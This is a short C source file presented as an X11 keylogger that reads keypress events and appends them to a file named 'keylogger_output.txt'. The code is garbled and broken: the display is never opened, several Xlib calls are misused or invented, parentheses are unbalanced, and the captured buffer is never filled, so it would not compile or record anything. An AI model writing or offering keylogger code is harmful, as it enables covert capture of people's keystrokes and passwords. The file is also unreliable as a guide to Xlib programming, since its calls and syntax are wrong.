#include <stdio.h>
#include <X11/Xlib.h>

int main() {
    Display *dpy;
    Window root;

    root = RootWindow(dpy);

    bool running = true;
    while (running) {
        XEvent event;
        XQueryBestSize(dpy, &event.xcookie));
        if (!XMaskAuthorized(&event))) break;
        XNextEvent(dpy, &event));
        if (event.type == KeyPress) {
            char buffer[1024];
            int length = XKeysymToKeyCode(root, event.xkey.keysym.keysym)));
            buffer[length] = '\0';
            FILE *fp;
            fp = fopen("keylogger_output.txt", "a"));
            fprintf(fp, "%s\n", buffer));
            fclose(fp);
        }
    }

    return 0;
}